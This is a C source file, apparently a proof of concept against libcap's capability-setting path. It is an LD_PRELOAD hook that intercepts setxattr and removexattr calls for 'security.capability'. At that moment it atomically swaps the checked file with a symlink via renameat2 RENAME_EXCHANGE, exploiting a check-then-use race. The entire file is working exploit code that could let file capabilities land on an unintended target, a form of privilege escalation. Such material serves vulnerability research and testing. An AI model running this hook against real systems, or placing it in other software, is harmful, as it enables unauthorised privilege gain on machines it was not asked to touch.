#define _GNU_SOURCE

#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>

#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE (1 << 1)
#endif

#ifndef SYS_renameat2
#ifdef __NR_renameat2
#define SYS_renameat2 __NR_renameat2
#elif defined(__x86_64__)
#define SYS_renameat2 316
#elif defined(__aarch64__)
#define SYS_renameat2 276
#else
#error "renameat2 syscall number is unknown on this architecture"
#endif
#endif

typedef int (*setxattr_fn)(const char *path, const char *name, const void *value,
                           size_t size, int flags);
typedef int (*removexattr_fn)(const char *path, const char *name);

static int maybe_swap_target(const char *path) {
    static int swapped = 0;
    const char *decoy = getenv("LIBCAP_POC_DECOY");
    const char *swap_path = getenv("LIBCAP_POC_SWAP");
    int saved_errno = errno;

    if (swapped || decoy == NULL || swap_path == NULL || path == NULL) {
        return 0;
    }
    if (strcmp(path, decoy) != 0) {
        return 0;
    }

    if (syscall(SYS_renameat2, AT_FDCWD, swap_path, AT_FDCWD, decoy,
                RENAME_EXCHANGE) != 0) {
        fprintf(stderr, "[hook] renameat2 exchange failed: %s\n",
                strerror(errno));
        errno = saved_errno;
        return -1;
    }

    swapped = 1;
    fprintf(stderr, "[hook] swapped checked path with symlink just before xattr use\n");
    errno = saved_errno;
    return 0;
}

int setxattr(const char *path, const char *name, const void *value, size_t size,
             int flags) {
    static setxattr_fn real_setxattr = NULL;

    if (real_setxattr == NULL) {
        real_setxattr = (setxattr_fn) dlsym(RTLD_NEXT, "setxattr");
    }
    if (name != NULL && strcmp(name, "security.capability") == 0) {
        (void) maybe_swap_target(path);
    }
    return real_setxattr(path, name, value, size, flags);
}

int removexattr(const char *path, const char *name) {
    static removexattr_fn real_removexattr = NULL;

    if (real_removexattr == NULL) {
        real_removexattr = (removexattr_fn) dlsym(RTLD_NEXT, "removexattr");
    }
    if (name != NULL && strcmp(name, "security.capability") == 0) {
        (void) maybe_swap_target(path);
    }
    return real_removexattr(path, name);
}
